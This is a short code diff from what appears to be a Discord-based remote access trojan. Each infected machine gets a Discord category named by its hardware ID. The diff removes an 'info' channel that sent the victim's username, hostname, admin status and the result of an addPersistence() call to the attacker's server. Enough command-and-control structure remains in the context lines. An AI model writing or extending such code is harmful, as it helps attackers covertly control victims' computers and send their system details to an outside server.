@@ -60,24 +60,7 @@ async def on_ready():
 
     if first_run:
         category = await guild.create_category(hwid)
-        await guild.create_text_channel('main', category=category)
-        await guild.create_text_channel('info', category=category)
-        
-        for channel in category.channels:
-                
-            if channel.name == 'info':
-                
-                info_buffer = ''
-                
-                is_persistant = addPersistence()
-                is_admin = isAdmin()                
-                username = os.getenv("UserName")
-                hostname = os.getenv("COMPUTERNAME")
-
-                info_buffer = "Info Dump\n\nPersistence: {}\nisAdmin: {}\nUsername: {}\nHostname: {}\n\n\n".format(is_persistant, is_admin, username, hostname)
-                
-                await channel.send(info_buffer)                
-                
+        await guild.create_text_channel('main', category=category)              
         
 @client.event
 async def on_message(msg):
